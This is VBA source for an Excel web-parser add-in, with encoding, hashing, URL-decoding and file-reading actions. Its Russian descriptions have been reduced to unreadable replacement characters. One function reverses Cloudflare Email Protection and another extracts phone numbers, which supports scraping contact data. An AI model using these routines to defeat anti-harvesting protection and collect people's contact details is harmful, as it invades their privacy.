    With AAs.AddAction(fc_EncodeAndFormat, "EncodeBase64", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Base64")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Base64, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Base64." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| 'test' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| dGVzdA== |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| text -> Base64," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd| 'UGFyc2Vy' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Parser |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Base64 -> text"
        .AddParameter "Direction", aps_List, "|fffd||fffd||fffd||fffd||fffd|", Array("text -> Base64", "Base64 -> text"), "text -> Base64"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "ChangeTextCharset", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "NewEncoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("utf-8", "windows-1251", "utf-16"), "windows-1251"
        .AddParameter "OldEncoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("utf-8", "windows-1251", "utf-16"), "windows-1251"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "Punycode", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|/|fffd||fffd| Punycode")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Punycode |fffd| Unicode |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Punycode->Unicode |fffd||fffd||fffd||fffd||fffd||fffd| http://xn--e1amhdlg6e.xn--p1ai/media/ |fffd||fffd||fffd||fffd||fffd| " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http://|fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd|/media/" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Unicode->Punycode |fffd||fffd||fffd||fffd||fffd||fffd| http://|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| " & _
                       "http://xn--80aebe3cdmfdkg.xn--d1abbgf6aiiy.xn--p1ai/%D1%81%D0%BE%D0%B2%D0%B5%D1%82%D1%8B"
        .AddParameter "Direction", aps_List, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("Punycode->Unicode", "Unicode->Punycode"), "Punycode->Unicode"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "CloudfareEmailDecode", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cloudflare Email Protection ")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| email |fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Cloudflare Email Protection." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| c9a6afafa0aaace7a4b9b389a4bdbce4a7acbde7bbbc |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| office.mpz@mtu-net.ru"
    End With

    With AAs.AddAction(fc_EncodeAndFormat, "GetPhoneNumbers", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| 11 |fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & _
                       "(|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 8 |fffd||fffd||fffd| +7)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Length", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("11", "10"), "11"
        .AddParameter "Prefix", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("8", "+7", ""), "8"
    End With

End Sub

Function Get_MD5_Hash(ByVal txt$) As String
    On Error Resume Next: Err.Clear
    Dim oUTF8, oMD5, abyt, i&, k&, hi&, lo&, chHi$, chLo$
    Set oUTF8 = CreateObject("System.Text.UTF8Encoding")
    Set oMD5 = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
    abyt = oMD5.ComputeHash_2(oUTF8.GetBytes_4(txt$))
    For i = 1 To LenB(abyt)
        k = AscB(MidB(abyt, i, 1))
        lo = k Mod 16: hi = (k - lo) / 16
        If hi > 9 Then chHi = Chr(Asc("a") + hi - 10) Else chHi = Chr(Asc("0") + hi)
        If lo > 9 Then chLo = Chr(Asc("a") + lo - 10) Else chLo = Chr(Asc("0") + lo)
        Get_MD5_Hash = Get_MD5_Hash & chHi & chLo
    Next
    Set oUTF8 = Nothing: Set oMD5 = Nothing
    If Err Then Get_MD5_Hash = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| MD5: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| .NET Framework"
End Function

Function URLDecode(ByVal strIn$) As String
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: http://www.zhaojunpeng.com/posts/2016/10/28/excel-urldecode
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| EducatedFool
    On Error Resume Next
    Dim sl&, tl&, key$, kl&
    sl = 1: tl = 1: key = "%": kl = Len(key)
    sl = InStr(sl, strIn, key, 1)
    Do While sl > 0
        If (tl = 1 And sl <> 1) Or tl < sl Then
            URLDecode = URLDecode & Mid(strIn, tl, sl - tl)
        End If
        Dim hh$, hi$, hl$, a$
        Select Case UCase(Mid(strIn, sl + kl, 1))
            Case "U"    'Unicode URLEncode
                a = Mid(strIn, sl + kl + 1, 4)
                URLDecode = URLDecode & ChrW("&H" & a)
                sl = sl + 6
            Case "E"    'UTF-8 URLEncode
                hh = Mid(strIn, sl + kl, 2)
                a = Int("&H" & hh)    'ascii?
                If Abs(a) < 128 Then
                    sl = sl + 3
                    URLDecode = URLDecode & Chr(a)
                Else
                    hi = Mid(strIn, sl + 3 + kl, 2)
                    hl = Mid(strIn, sl + 6 + kl, 2)
                    a = ("&H" & hh And &HF) * 2 ^ 12 Or ("&H" & hi And &H3F) * 2 ^ 6 Or ("&H" & hl And &H3F)
                    If a < 0 Then a = a + 65536
                    URLDecode = URLDecode & ChrW(a)
                    sl = sl + 9
                End If
            Case Else    'Asc URLEncode
                hh = Mid(strIn, sl + kl, 2)    '??
                a = Int("&H" & hh)    'ascii?

                If Abs(a) < 128 Then
                    sl = sl + 3
                Else
                    hi = Mid(strIn, sl + 3 + kl, 2)    '??
                    'a = Int("&H" & hh & hi) '?ascii?
                    a = (Int("&H" & hh) - 194) * 64 + Int("&H" & hi)
                    sl = sl + 6
                End If
                URLDecode = URLDecode & ChrW(a)
        End Select
        tl = sl
        sl = InStr(sl, strIn, key, 1)
    Loop
    URLDecode = URLDecode & Mid(strIn, tl)
End Function

Function CloudfareEmailDecode(ByVal txt$) As String    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If InStr(1, txt, "protection#", vbTextCompare) > 0 Then txt = Split(txt, "protection#")(1)
    If InStr(1, txt, """", vbTextCompare) > 0 Then txt = Split(txt, """")(0)
    If InStr(1, txt, "'", vbTextCompare) > 0 Then txt = Split(txt, "'")(0)
    Dim k As Integer, i As Long, l As Integer
    k = Val("&h" & Mid(txt, 1, 2))
    For i = 1 To Len(txt) / 2 - 1
        l = Val("&h" & Mid(txt, i * 2 + 1, 2))
        CloudfareEmailDecode = CloudfareEmailDecode & Chr(l Xor k)
    Next
End Function

Function GetPhoneNumbers(ByVal txt$, Optional ByVal DigitsCount& = 11, Optional ByVal prefix$ = "8") As String
    On Error Resume Next
    Dim char, arr, i&, pos&, n$, l$, coll As New Collection, item, res$
    For Each char In Array(",", ";", "|fffd||fffd||fffd|", "+", "|fffd||fffd||fffd||fffd|", "  8-", ".")
        txt$ = Replace(txt$, char, ";")
    Next
    If DigitsCount& = 0 Then DigitsCount& = 11

    arr = Split(txt, ";")
    For i = LBound(arr) To UBound(arr)
        n$ = ""    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        For pos = 1 To Len(arr(i))
            l$ = Mid(arr(i), pos, 1)
            If l$ Like "#" Then n$ = n$ & l$
        Next pos

        Select Case Len(n$)
            Case DigitsCount&: n$ = prefix$ & Mid(n$, 2)
            Case DigitsCount& - 1: n$ = prefix$ & n$
            Case Else: n$ = ""
        End Select
        If Len(n$) Then coll.Add n$, n$
    Next i

    ReDim resArr(1 To coll.Count)
    For i = 1 To coll.Count: resArr(i) = coll(i): Next
    GetPhoneNumbers = Join(resArr, ARSEP)

    Set coll = Nothing
End Function
Attribute VB_Name = "mod_AAs_Files"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Files                    Version:
' Author        : Igor Vakhnenko                   Date: 02.02.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module
Public WA As Object

Sub InitializeActions_Files(ByRef AAs As ArrayActions)
    
    With AAs.AddAction(fc_Files, "FilenamesCollection", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| c:\folder\subfolder\), |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| \folder)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| \, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| folder"
        .AddParameter "Folder", aps_Text, "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "SearchDeep", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| 1 - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", Array("1", "2", "3", "4", "999"), "1"
        .AddParameter "Mask", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("*.*", "*.xls*", "*.doc*", "*.txt", "*.html"), "*.*"
    End With
    
    With AAs.AddAction(fc_Files, "GetTextFromFile_TXT", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| txt, xml, html)." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Word |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd|.|fffd|. doc - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, c:\folder\filename.txt" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| parser.xla, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| \, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, \filename.txt" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, filename.txt"
        
        .AddParameter "Filename", aps_Text, "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("utf-8", "windows-1251", "utf-16"), "windows-1251"
    End With
    
    With AAs.AddAction(fc_Files, "GetTextFromFile_WORD", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| MS Word")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| MS Word (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| doc, docx, docm, rtf)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| dialog - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, c:\folder\filename.doc" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| parser.xla, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| \, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, \filename.doc" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, filename.doc"
        
        .AddParameter "Filename", aps_Text, "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "RestartApp", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MS Word", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
        .AddParameter "ReadOnly", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
        .AddParameter "OutputFormat", aps_List, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("text", "HTML"), "text"
    End With
    
